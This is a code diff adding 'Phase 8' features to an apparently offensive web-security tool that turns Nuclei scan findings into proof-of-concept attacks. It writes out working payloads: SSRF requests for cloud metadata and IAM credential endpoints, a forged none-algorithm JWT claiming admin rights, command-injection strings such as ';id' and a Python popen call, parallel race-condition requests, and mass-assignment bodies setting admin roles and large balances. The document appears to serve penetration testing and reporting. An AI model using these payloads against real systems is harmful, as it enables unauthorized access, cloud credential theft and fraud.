@@ -10,9 +10,16 @@ Phase 5 enhancements:
   - Enhanced categorization for business logic & access control flaws
   - Prioritization of Critical and High severity findings
 
+Phase 8 enhancements:
+  - Advanced high-impact vulnerability detection: RCE, SSRF cloud metadata,
+    JWT attacks, race conditions, mass assignment, business logic bypass
+  - Specialized PoC generators per vulnerability type (SSRF metadata curl,
+    JWT exploitation, race condition parallel requests, mass assignment)
+  - Enhanced fingerprinting for advanced vuln categories
+
 Flow:
   Nuclei raw output -> parse -> generate fingerprint -> classify triage tags
-  -> build PoC -> upsert Finding -> link Asset
+  -> build specialized PoC -> upsert Finding -> link Asset
 """
 
 import hashlib
@@ -65,16 +72,43 @@ _ACCESS_CONTROL_KEYWORDS = {
     "javascript": TriageTag.JAVASCRIPT_SECRETS,
     "js-secret": TriageTag.JAVASCRIPT_SECRETS,
     "env-exposure": TriageTag.JAVASCRIPT_SECRETS,
+    # Phase 8: Advanced high-impact keywords
+    "rce": TriageTag.REMOTE_CODE_EXECUTION,
+    "remote-code": TriageTag.REMOTE_CODE_EXECUTION,
+    "command-injection": TriageTag.REMOTE_CODE_EXECUTION,
+    "os-command": TriageTag.REMOTE_CODE_EXECUTION,
+    "code-injection": TriageTag.REMOTE_CODE_EXECUTION,
+    "ssrf": TriageTag.SSRF_CLOUD_METADATA,
+    "cloud-metadata": TriageTag.SSRF_CLOUD_METADATA,
+    "aws-metadata": TriageTag.SSRF_CLOUD_METADATA,
+    "gcp-metadata": TriageTag.SSRF_CLOUD_METADATA,
+    "azure-metadata": TriageTag.SSRF_CLOUD_METADATA,
+    "imds": TriageTag.SSRF_CLOUD_METADATA,
+    "jwt-none": TriageTag.JWT_ATTACK,
+    "jwt-algorithm": TriageTag.JWT_ATTACK,
+    "jwt-confusion": TriageTag.JWT_ATTACK,
+    "jwt-signing": TriageTag.JWT_ATTACK,
+    "jwt-secret": TriageTag.JWT_ATTACK,
+    "race-condition": TriageTag.RACE_CONDITION,
+    "race": TriageTag.RACE_CONDITION,
+    "concurrent": TriageTag.RACE_CONDITION,
+    "mass-assignment": TriageTag.MASS_ACCOUNT_TAKEOVER,
+    "property-injection": TriageTag.MASS_ACCOUNT_TAKEOVER,
+    "over-posting": TriageTag.MASS_ACCOUNT_TAKEOVER,
+    "business-logic-bypass": TriageTag.BUSINESS_LOGIC_BYPASS,
+    "logic-bypass": TriageTag.BUSINESS_LOGIC_BYPASS,
+    "negative-amount": TriageTag.BUSINESS_LOGIC_BYPASS,
+    "price-manipulation": TriageTag.BUSINESS_LOGIC_BYPASS,
 }
 
 # Template-ID keywords that map to FindingCategory
+# More specific keywords must come before less specific ones (dict order matters)
 _CATEGORY_KEYWORDS = {
     "idor": FindingCategory.IDOR,
     "access-control": FindingCategory.ACCESS_CONTROL,
     "auth-bypass": FindingCategory.AUTH_BYPASS,
     "authentication": FindingCategory.AUTH_BYPASS,
     "unauth": FindingCategory.AUTH_BYPASS,
-    "business-logic": FindingCategory.BUSINESS_LOGIC,
     "sensitive": FindingCategory.SENSITIVE_DATA,
     "secret": FindingCategory.SENSITIVE_DATA,
     "xss": FindingCategory.XSS,
@@ -82,6 +116,32 @@ _CATEGORY_KEYWORDS = {
     "sqli": FindingCategory.SQLI,
     "sql-injection": FindingCategory.SQLI,
     "ssrf": FindingCategory.SSRF,
+    "cloud-metadata": FindingCategory.SSRF_CLOUD_METADATA,
+    "aws-metadata": FindingCategory.SSRF_CLOUD_METADATA,
+    "gcp-metadata": FindingCategory.SSRF_CLOUD_METADATA,
+    "azure-metadata": FindingCategory.SSRF_CLOUD_METADATA,
+    "imds": FindingCategory.SSRF_CLOUD_METADATA,
+    "remote-code": FindingCategory.RCE,
+    "command-injection": FindingCategory.RCE,
+    "os-command": FindingCategory.RCE,
+    "code-injection": FindingCategory.RCE,
+    "rce": FindingCategory.RCE,
+    "jwt-none": FindingCategory.JWT_VULNERABILITY,
+    "jwt-algorithm": FindingCategory.JWT_VULNERABILITY,
+    "jwt-confusion": FindingCategory.JWT_VULNERABILITY,
+    "jwt-secret": FindingCategory.JWT_VULNERABILITY,
+    "jwt": FindingCategory.JWT_VULNERABILITY,
+    "business-logic-bypass": FindingCategory.BUSINESS_LOGIC_BYPASS,
+    "logic-bypass": FindingCategory.BUSINESS_LOGIC_BYPASS,
+    "negative-amount": FindingCategory.BUSINESS_LOGIC_BYPASS,
+    "price-manipulation": FindingCategory.BUSINESS_LOGIC_BYPASS,
+    "business-logic": FindingCategory.BUSINESS_LOGIC,
+    "race-condition": FindingCategory.RACE_CONDITION,
+    "concurrent": FindingCategory.RACE_CONDITION,
+    "race": FindingCategory.RACE_CONDITION,
+    "mass-assignment": FindingCategory.MASS_ASSIGNMENT,
+    "property-injection": FindingCategory.MASS_ASSIGNMENT,
+    "over-posting": FindingCategory.MASS_ASSIGNMENT,
     "lfi": FindingCategory.FILE_INCLUSION,
     "rfi": FindingCategory.FILE_INCLUSION,
     "file-inclusion": FindingCategory.FILE_INCLUSION,
@@ -204,12 +264,38 @@ def _generate_poc_curl(
     severity: FindingSeverity,
     template_id: str,
     auth_headers: Optional[dict] = None,
+    category: str = "",
 ) -> str:
     """Auto-generate a PoC curl command for reproduction.
 
-    Constructs a clear, copy-pasteable curl command that reproduces the
-    finding. Includes auth headers when available for authenticated findings.
+    Phase 8: Dispatches to specialized PoC generators for advanced vulns:
+    - RCE: Safe detection payloads (id, sleep)
+    - SSRF cloud metadata: Metadata endpoint fetch
+    - JWT: Algorithm confusion, none-algorithm, weak secret
+    - Race condition: Parallel request script
+    - Mass assignment: Privileged field injection
+    - Default: Standard curl with auth headers
     """
+    # Phase 8: Route to specialized generators based on category
+    cat_lower = category.lower() if category else ""
+    tid_lower = template_id.lower() if template_id else ""
+
+    if cat_lower in ("rce",) or "rce" in tid_lower or "command-injection" in tid_lower or "os-command" in tid_lower:
+        return _generate_poc_curl_rce(host, matched_at, template_id, auth_headers)
+
+    if cat_lower in ("ssrf_cloud_metadata",) or "cloud-metadata" in tid_lower or "imds" in tid_lower or "aws-metadata" in tid_lower or "gcp-metadata" in tid_lower or "azure-metadata" in tid_lower:
+        return _generate_poc_curl_ssrf_metadata(host, matched_at, template_id, auth_headers)
+
+    if cat_lower in ("jwt_vulnerability",) or "jwt" in tid_lower:
+        return _generate_poc_curl_jwt(host, matched_at, template_id, auth_headers)
+
+    if cat_lower in ("race_condition",) or "race" in tid_lower or "concurrent" in tid_lower:
+        return _generate_poc_curl_race_condition(host, matched_at, template_id, auth_headers)
+
+    if cat_lower in ("mass_assignment",) or "mass-assignment" in tid_lower or "over-posting" in tid_lower or "property-injection" in tid_lower:
+        return _generate_poc_curl_mass_assignment(host, matched_at, template_id, auth_headers)
+
+    # Default: standard PoC curl
     # Determine target URL
     if matched_at and matched_at.startswith("http"):
         target_url = matched_at
@@ -236,6 +322,356 @@ def _generate_poc_curl(
     parts.append(f'"{target_url}"')
 
     return " \\\n  ".join(parts)
+
+
+# --- Phase 8: Specialized PoC Generators ---
+
+
+def _generate_poc_curl_ssrf_metadata(
+    host: str,
+    matched_at: str,
+    template_id: str,
+    auth_headers: Optional[dict] = None,
+) -> str:
+    """Generate a specialized PoC curl for SSRF cloud metadata attacks.
+
+    Produces curl commands targeting cloud provider metadata endpoints:
+    - AWS: http://169.254.169.254/latest/meta-data/
+    - GCP: http://metadata.google.internal/computeMetadata/v1/
+    - Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
+    """
+    if matched_at and matched_at.startswith("http"):
+        target_url = matched_at
+    elif matched_at:
+        target_url = f"https://{host}{matched_at}" if matched_at.startswith("/") else f"https://{host}/{matched_at}"
+    else:
+        target_url = f"https://{host}"
+
+    parts = ["curl", "-v", "-k"]
+
+    if auth_headers:
+        for key, value in auth_headers.items():
+            parts.append(f'-H "{key}: {value}"')
+
+    parts.append('-H "User-Agent: RedPulse-SSRF-PoC/1.0"')
+    parts.append('-H "Accept: */*"')
+
+    # SSRF payload to fetch cloud metadata
+    ssrf_payload = (
+        f"-d 'url=http://169.254.169.254/latest/meta-data/' "
+        f"-d 'callback=http://169.254.169.254/latest/meta-data/' "
+        f"-d 'metadata=http://169.254.169.254/latest/meta-data/'"
+    )
+    parts.append(ssrf_payload)
+
+    parts.append("-w '\\nHTTP_CODE:%{http_code}\\nSIZE:%{size_download}\\n'")
+    parts.append(f'"{target_url}"')
+
+    return " \\\n  ".join(parts)
+
+
+def _generate_poc_curl_jwt(
+    host: str,
+    matched_at: str,
+    template_id: str,
+    auth_headers: Optional[dict] = None,
+) -> str:
+    """Generate a specialized PoC curl for JWT vulnerabilities.
+
+    Covers: none-algorithm bypass, weak secret brute-force,
+    algorithm confusion (RS256->HS256), key injection.
+    """
+    if matched_at and matched_at.startswith("http"):
+        target_url = matched_at
+    elif matched_at:
+        target_url = f"https://{host}{matched_at}" if matched_at.startswith("/") else f"https://{host}/{matched_at}"
+    else:
+        target_url = f"https://{host}"
+
+    tid = template_id.lower()
+    parts = ["curl", "-v", "-k"]
+
+    if auth_headers:
+        for key, value in auth_headers.items():
+            parts.append(f'-H "{key}: {value}"')
+
+    # Craft JWT based on vulnerability type
+    if "none" in tid or "algorithm" in tid:
+        # JWT none-algorithm bypass
+        fake_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."
+        parts.append(f'-H "Authorization: Bearer {fake_jwt}"')
+    elif "secret" in tid:
+        # Weak JWT secret - use common test secrets
+        parts.append('-H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0.test"')
+    elif "confusion" in tid:
+        # Algorithm confusion - RS256 -> HS256
+        parts.append('-H "Authorization: Bearer <forge_with_public_key_as_secret>"')
+    else:
+        parts.append('-H "Authorization: Bearer <forge_jwt_with_modified_claims>"')
+
+    parts.append('-H "Content-Type: application/json"')
+    parts.append('-H "Accept: application/json"')
+    parts.append("-w '\\nHTTP_CODE:%{http_code}\\nSIZE:%{size_download}\\n'")
+    parts.append(f'"{target_url}"')
+
+    return " \\\n  ".join(parts)
+
+
+def _generate_poc_curl_race_condition(
+    host: str,
+    matched_at: str,
+    template_id: str,
+    auth_headers: Optional[dict] = None,
+) -> str:
+    """Generate a PoC for race condition testing.
+
+    Produces parallel curl commands using GNU parallel or background processes.
+    """
+    if matched_at and matched_at.startswith("http"):
+        target_url = matched_at
+    elif matched_at:
+        target_url = f"https://{host}{matched_at}" if matched_at.startswith("/") else f"https://{host}/{matched_at}"
+    else:
+        target_url = f"https://{host}"
+
+    auth_flag = ""
+    if auth_headers:
+        for key, value in auth_headers.items():
+            auth_flag += f' -H "{key}: {value}"'
+
+    # Generate parallel request script
+    poc = f"""# Race Condition PoC - Send 10 parallel requests
+# Use: bash race_condition_poc.sh
+for i in $(seq 1 10); do
+  curl -s -o /dev/null -w "Request $i: HTTP {{http_code}}\\n" \\
+    -k {auth_flag} \\
+    -H "User-Agent: RedPulse-Race-PoC/1.0" \\
+    "{target_url}" &
+done
+wait
+echo "All requests completed. Check for inconsistent state."""
+
+    return poc
+
+
+def _generate_poc_curl_mass_assignment(
+    host: str,
+    matched_at: str,
+    template_id: str,
+    auth_headers: Optional[dict] = None,
+) -> str:
+    """Generate a PoC curl for mass assignment / over-posting attacks.
+
+    Demonstrates injecting privileged fields (role, is_admin, price, balance)
+    into a normal API request.
+    """
+    if matched_at and matched_at.startswith("http"):
+        target_url = matched_at
+    elif matched_at:
+        target_url = f"https://{host}{matched_at}" if matched_at.startswith("/") else f"https://{host}/{matched_at}"
+    else:
+        target_url = f"https://{host}"
+
+    parts = ["curl", "-v", "-k"]
+
+    if auth_headers:
+        for key, value in auth_headers.items():
+            parts.append(f'-H "{key}: {value}"')
+
+    parts.append('-H "Content-Type: application/json"')
+    parts.append('-H "Accept: application/json"')
+    parts.append('-H "User-Agent: RedPulse-PoC/1.0"')
+
+    # Mass assignment payload with privileged fields
+    mass_payload = (
+        '{'
+        '"name":"test_user",'
+        '"email":"test@example.com",'
+        '"role":"admin",'
+        '"is_admin":true,'
+        '"price":0,'
+        '"balance":999999,'
+        '"discount_percent":100'
+        '}'
+    )
+    parts.append(f"-d '{mass_payload}'")
+    parts.append("-w '\\nHTTP_CODE:%{http_code}\\nSIZE:%{size_download}\\n'")
+    parts.append(f'"{target_url}"')
+
+    return " \\\n  ".join(parts)
+
+
+def _generate_poc_curl_rce(
+    host: str,
+    matched_at: str,
+    template_id: str,
+    auth_headers: Optional[dict] = None,
+) -> str:
+    """Generate a PoC curl for RCE / command injection.
+
+    Uses safe detection payloads (sleep, ping) to confirm without exploitation.
+    """
+    if matched_at and matched_at.startswith("http"):
+        target_url = matched_at
+    elif matched_at:
+        target_url = f"https://{host}{matched_at}" if matched_at.startswith("/") else f"https://{host}/{matched_at}"
+    else:
+        target_url = f"https://{host}"
+
+    parts = ["curl", "-v", "-k"]
+
+    if auth_headers:
+        for key, value in auth_headers.items():
+            parts.append(f'-H "{key}: {value}"')
+
+    parts.append('-H "User-Agent: RedPulse-RCE-PoC/1.0"')
+    parts.append('-H "Accept: */*"')
+
+    # Safe RCE detection payloads (no destructive commands)
+    tid = template_id.lower()
+    if "os-command" in tid or "command-injection" in tid:
+        parts.append("-d 'input=id'")
+        parts.append("-d 'cmd=id'")
+        parts.append("-d 'command=id'")
+    elif "code-injection" in tid:
+        parts.append("-d 'input=__import__(\"os\").popen(\"id\").read()'")
+        parts.append("-d 'template={{range(0,1)}}{{end}}'")
+    else:
+        parts.append("-d 'input=;id'")
+        parts.append("-d 'cmd=|id'")
+
+    parts.append("-w '\\nHTTP_CODE:%{http_code}\\nSIZE:%{size_download}\\n'")
+    parts.append(f'"{target_url}"')
+
+    return " \\\n  ".join(parts)
+
+
+def _generate_poc_steps_specialized(
+    title: str,
+    template_id: str,
+    severity: FindingSeverity,
+    matched_at: str,
+    host: str,
+    category: str,
+    description: str,
+    sensitive_params: List[str],
+) -> str:
+    """Generate specialized reproduction steps for advanced high-impact vulns.
+
+    Phase 8: Covers RCE, SSRF cloud metadata, JWT attacks, race conditions,
+    mass assignment, and business logic bypass.
+    """
+    steps = []
+
+    steps.append(f"## PoC: {title}")
+    steps.append(f"**Severity:** {severity.value.upper()}")
+    steps.append(f"**Category:** {category}")
+    steps.append(f"**Template:** {template_id}")
+    steps.append("")
+    steps.append("### Reproduction Steps")
+
+    tid = template_id.lower()
+
+    if category in ("rce",) or "rce" in tid or "command-injection" in tid:
+        steps.append(f"1. Identify the injection point at: `{matched_at or host}`")
+        steps.append("2. Inject a safe detection payload: `;id` or `|id` or `` `id` ``")
+        steps.append("3. Observe the command output in the HTTP response")
+        steps.append("4. Verify by injecting: `;sleep 5` and observing a 5-second delay")
+        steps.append("5. **Impact:** Full server compromise — read files, reverse shell, pivot")
+        steps.append("")
+        steps.append("### Safe Detection Payloads")
+        steps.append("- Linux: `;id`, `|id`, `` `id` ``")
+        steps.append("- Windows: `&whoami`, `|whoami`")
+
+    elif category in ("ssrf_cloud_metadata",) or "cloud-metadata" in tid or "imds" in tid:
+        steps.append(f"1. Identify the SSRF injection point at: `{matched_at or host}`")
+        steps.append("2. Craft a request to the cloud metadata endpoint:")
+        steps.append("   - AWS: `http://169.254.169.254/latest/meta-data/`")
+        steps.append("   - GCP: `http://metadata.google.internal/computeMetadata/v1/`")
+        steps.append("   - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`")
+        steps.append("3. Observe metadata response containing instance credentials")
+        steps.append("4. Fetch IAM credentials: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`")
+        steps.append("5. **Impact:** Cloud account takeover, lateral movement, data exfiltration")
+        steps.append("")
+        steps.append("### Metadata Endpoints")
+        steps.append("- Instance ID: `/latest/meta-data/instance-id`")
+        steps.append("- IAM Role: `/latest/meta-data/iam/security-credentials/`")
+        steps.append("- User Data: `/latest/user-data`")
+
+    elif category in ("jwt_vulnerability",) or "jwt" in tid:
+        steps.append(f"1. Intercept a JWT token from: `{matched_at or host}`")
+        steps.append("2. Decode the JWT header and payload (e.g., at jwt.io)")
+        if "none" in tid or "algorithm" in tid:
+            steps.append("3. **None-algorithm attack:** Change `alg` from `RS256` to `none`")
+            steps.append("4. Remove the signature portion of the JWT")
+            steps.append("5. Send the forged token — server accepts it without verification")
+        elif "confusion" in tid:
+            steps.append("3. **Algorithm confusion:** Obtain the server's RSA public key")
+            steps.append("4. Sign the JWT with HS256 using the public key as the HMAC secret")
+            steps.append("5. The server verifies with the public key, matching the HMAC")
+        elif "secret" in tid:
+            steps.append("3. **Weak secret:** Try common secrets: `secret`, `password`, `key123`")
+            steps.append("4. Use jwt_tool or hashcat to brute-force the HMAC secret")
+            steps.append("5. Forge arbitrary claims once the secret is recovered")
+        else:
+            steps.append("3. Modify the JWT claims (e.g., set `role: admin`)")
+            steps.append("4. Re-sign with the appropriate algorithm")
+            steps.append("5. Send the modified token and observe privilege escalation")
+        steps.append("6. **Impact:** Authentication bypass, privilege escalation, account takeover")
+
+    elif category in ("race_condition",) or "race" in tid:
+        steps.append(f"1. Identify the state-changing endpoint: `{matched_at or host}`")
+        steps.append("2. Capture the request in Burp Suite or similar proxy")
+        steps.append("3. Send 10-20 parallel requests using Turbo Intruder or parallel curl")
+        steps.append("4. Observe for inconsistent state (e.g., double-spending, duplicate credits)")
+        steps.append("5. Check database state after the burst — resources may be over-allocated")
+        steps.append("6. **Impact:** Financial loss, duplicate resource allocation, data corruption")
+        steps.append("")
+        steps.append("### Parallel Request Script")
+        steps.append("```bash")
+        steps.append("for i in $(seq 1 10); do")
+        steps.append('  curl -s -o /dev/null -w "Request $i: HTTP {http_code}\\n" &')
+        steps.append("done")
+        steps.append("wait")
+        steps.append("```")
+
+    elif category in ("mass_assignment",) or "mass-assignment" in tid or "over-posting" in tid:
+        steps.append(f"1. Identify the update endpoint: `{matched_at or host}`")
+        steps.append("2. Intercept a normal PUT/PATCH request")
+        steps.append("3. Add privileged fields to the JSON body:")
+        steps.append('   ```json')
+        steps.append('   {')
+        steps.append('     "name": "normal_user",')
+        steps.append('     "role": "admin",')
+        steps.append('     "is_admin": true,')
+        steps.append('     "price": 0,')
+        steps.append('     "balance": 999999')
+        steps.append('   }')
+        steps.append('   ```')
+        steps.append("4. Send the modified request")
+        steps.append("5. Verify the privileged fields were accepted and persisted")
+        steps.append("6. **Impact:** Privilege escalation, financial manipulation, data corruption")
+
+    elif category in ("business_logic_bypass",) or "business-logic-bypass" in tid or "logic-bypass" in tid:
+        steps.append(f"1. Identify the business logic flow at: `{matched_at or host}`")
+        steps.append("2. Analyze the multi-step process (e.g., checkout, registration)")
+        steps.append("3. Attempt to skip steps by directly accessing later endpoints")
+        steps.append("4. Try negative values, zero amounts, or boundary conditions")
+        steps.append("5. Manipulate sequence: submit step 3 before step 1")
+        steps.append("6. **Impact:** Free products, bypassed payments, unauthorized access")
+
+    else:
+        # Fallback for unknown advanced categories
+        steps.append(f"1. Access the vulnerable endpoint: `{matched_at or host}`")
+        steps.append("2. Follow the attack vector described in the finding description")
+        steps.append("3. Verify the vulnerability is exploitable")
+
+    if description:
+        steps.append("")
+        steps.append("### Description")
+        steps.append(description[:500])
+
+    return "\n".join(steps)
 
 
 def _generate_poc_steps(
@@ -380,23 +816,43 @@ async def ingest_nuclei_finding(
     # Phase 5: Extract sensitive parameters (IDOR vectors)
     sensitive_params = _extract_idor_params(matched_at)
 
-    # Phase 5: Generate PoC for high-severity findings
+    # Phase 5+8: Generate PoC for high-severity findings
     poc_curl = None
     poc_steps = None
     if severity in (FindingSeverity.CRITICAL, FindingSeverity.HIGH):
-        poc_curl = _generate_poc_curl(host, matched_at, severity, template_id, auth_headers)
+        poc_curl = _generate_poc_curl(
+            host, matched_at, severity, template_id, auth_headers, category
+        )
         title = raw_finding.get("info", {}).get("name", template_id) if isinstance(raw_finding.get("info"), dict) else template_id
         description = _build_description(raw_finding)
-        poc_steps = _generate_poc_steps(
-            title=title or template_id,
-            template_id=template_id,
-            severity=severity,
-            matched_at=matched_at,
-            host=host,
-            category=category,
-            description=description,
-            sensitive_params=sensitive_params,
-        )
+
+        # Phase 8: Use specialized steps for advanced vuln categories
+        _advanced_categories = {
+            "rce", "ssrf_cloud_metadata", "jwt_vulnerability",
+            "race_condition", "mass_assignment", "business_logic_bypass",
+        }
+        if category in _advanced_categories:
+            poc_steps = _generate_poc_steps_specialized(
+                title=title or template_id,
+                template_id=template_id,
+                severity=severity,
+                matched_at=matched_at,
+                host=host,
+                category=category,
+                description=description,
+                sensitive_params=sensitive_params,
+            )
+        else:
+            poc_steps = _generate_poc_steps(
+                title=title or template_id,
+                template_id=template_id,
+                severity=severity,
+                matched_at=matched_at,
+                host=host,
+                category=category,
+                description=description,
+                sensitive_params=sensitive_params,
+            )
 
     # Build title from template
     title = raw_finding.get("info", {}).get("name", template_id) if isinstance(raw_finding.get("info"), dict) else template_id
